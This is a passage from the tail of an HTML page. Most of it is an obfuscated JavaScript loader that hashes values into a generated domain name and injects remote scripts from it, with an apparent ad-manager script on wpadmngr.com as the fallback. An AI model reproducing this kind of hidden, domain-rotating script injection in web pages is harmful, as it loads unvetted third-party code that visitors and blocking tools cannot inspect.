,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>